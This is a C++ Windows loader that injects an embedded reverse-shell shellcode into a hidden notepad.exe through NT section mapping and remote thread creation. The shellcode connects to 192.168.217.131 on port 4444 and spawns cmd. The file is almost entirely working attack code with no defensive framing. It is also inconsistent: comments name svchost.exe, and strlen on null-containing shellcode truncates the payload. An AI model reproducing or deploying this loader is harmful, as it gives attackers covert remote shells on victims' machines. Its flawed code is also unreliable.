#include <windows.h>
#include <winternl.h>
#include <iostream>

#pragma comment(lib, "ntdll.lib")

typedef NTSTATUS(NTAPI *NtCreateSection_t)(
    PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PLARGE_INTEGER, ULONG, ULONG, HANDLE);

typedef NTSTATUS(NTAPI *NtMapViewOfSection_t)(
    HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, DWORD, ULONG, ULONG);

typedef NTSTATUS(NTAPI *NtUnmapViewOfSection_t)(
    HANDLE, PVOID);

typedef NTSTATUS(NTAPI *NtCreateThreadEx_t)(
    PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, HANDLE, PVOID, PVOID, BOOLEAN, ULONG_PTR, ULONG_PTR, ULONG_PTR, PVOID);

unsigned char shellcode[] =
                        "\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50"
                        "\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26"
                        "\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7"
                        "\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78"
                        "\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3"
                        "\x3a\x49\x8b\x34\x8b\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01"
                        "\xc7\x38\xe0\x75\xf6\x03\x7d\xf8\x3b\x7d\x24\x75\xe4\x58"
                        "\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3"
                        "\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a"
                        "\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb\x8d\x5d\x68\x33\x32"
                        "\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff"
                        "\xd5\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b"
                        "\x00\xff\xd5\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea\x0f"
                        "\xdf\xe0\xff\xd5\x97\x6a\x05\x68\xc0\xa8\xd9\x83\x68\x02"
                        "\x00\x11\x5c\x89\xe6\x6a\x10\x56\x57\x68\x99\xa5\x74\x61"
                        "\xff\xd5\x85\xc0\x74\x0c\xff\x4e\x08\x75\xec\x68\xf0\xb5"
                        "\xa2\x56\xff\xd5\x68\x63\x6d\x64\x00\x89\xe3\x57\x57\x57"
                        "\x31\xf6\x6a\x12\x59\x56\xe2\xfd\x66\xc7\x44\x24\x3c\x01"
                        "\x01\x8d\x44\x24\x10\xc6\x00\x44\x54\x50\x56\x56\x56\x46"
                        "\x56\x4e\x56\x56\x53\x56\x68\x79\xcc\x3f\x86\xff\xd5\x89"
                        "\xe0\x4e\x56\x46\xff\x30\x68\x08\x87\x1d\x60\xff\xd5\xbb"
                        "\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c"
                        "\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53"
                        "\xff\xd5";
int main() {
   
    if (!AllocConsole()) {
        std::cerr << "Failed to allocate console" << std::endl;
        return -1;
    }
    freopen("CONOUT$", "w", stdout);
    freopen("CONOUT$", "w", stderr);

    std::cout << "Console allocated successfully" << std::endl;

    // Load ntdll.dll
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    if (!hNtdll) {
        std::cerr << "Failed to get handle for ntdll.dll" << std::endl;
        return -1;
    }

    std::cout << "Loaded ntdll.dll" << std::endl;

    // Resolve function addresses from ntdll.dll
    NtCreateSection_t NtCreateSection = (NtCreateSection_t)GetProcAddress(hNtdll, "NtCreateSection");
    NtMapViewOfSection_t NtMapViewOfSection = (NtMapViewOfSection_t)GetProcAddress(hNtdll, "NtMapViewOfSection");
    NtUnmapViewOfSection_t NtUnmapViewOfSection = (NtUnmapViewOfSection_t)GetProcAddress(hNtdll, "NtUnmapViewOfSection");
    NtCreateThreadEx_t NtCreateThreadEx = (NtCreateThreadEx_t)GetProcAddress(hNtdll, "NtCreateThreadEx");

    if (!NtCreateSection || !NtMapViewOfSection || !NtUnmapViewOfSection || !NtCreateThreadEx) {
        std::cerr << "Failed to get address of one or more NT functions" << std::endl;
        return -1;
    }

    std::cout << "Resolved NT functions" << std::endl;

    HANDLE hSection;
    LARGE_INTEGER liSize;
    liSize.QuadPart = strlen((char*)shellcode); // Set the size to shellcode length
    SIZE_T viewSize = 0;
    PVOID baseAddr = NULL;

    // Step 1: Create a section object in-memory without touching the disk
    NTSTATUS status = NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, &liSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
    if (!NT_SUCCESS(status)) {
        std::cerr << "Failed to create section, NTSTATUS: " << status << std::endl;
        return -1;
    }

    std::cout << "Section created successfully" << std::endl;

    // Step 2: Create a new process (we use svchost.exe as a target)
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE; // Hide the window
    if (!CreateProcessW(L"C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        std::cerr << "Failed to create new process, error: " << GetLastError() << std::endl;
        CloseHandle(hSection);
        return -1;
    }

    std::cout << "Process created successfully" << std::endl;

    // Step 3: Map the section to the new process's memory
    status = NtMapViewOfSection(hSection, pi.hProcess, &baseAddr, 0, 0, NULL, &viewSize, 2, 0, PAGE_EXECUTE_READWRITE);
    if (!NT_SUCCESS(status)) {
        std::cerr << "Failed to map section, NTSTATUS: " << status << std::endl;
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(hSection);
        return -1;
    }

    std::cout << "Section mapped successfully" << std::endl;

    // Step 4: Inject shellcode into the mapped section
    memcpy(baseAddr, shellcode, strlen((char*)shellcode));

    // Step 5: Unmap the section from the current process
    status = NtUnmapViewOfSection(GetCurrentProcess(), baseAddr);
    if (!NT_SUCCESS(status)) {
        std::cerr << "Failed to unmap section, NTSTATUS: " << status << std::endl;
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(hSection);
        return -1;
    }

    std::cout << "Section unmapped successfully" << std::endl;

    // Step 6: Create a thread in the new process and start execution
    HANDLE hThread;
    status = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, pi.hProcess, baseAddr, NULL, FALSE, 0, 0, 0, NULL);
    if (!NT_SUCCESS(status)) {
        std::cerr << "Failed to create thread, NTSTATUS: " << status << std::endl;
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(hSection);
        return -1;
    }

    std::cout << "Thread created successfully" << std::endl;

    // Cleanup
    CloseHandle(hThread);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(hSection);

    std::cout << "Shellcode executed successfully in svchost.exe" << std::endl;

    return 0;
}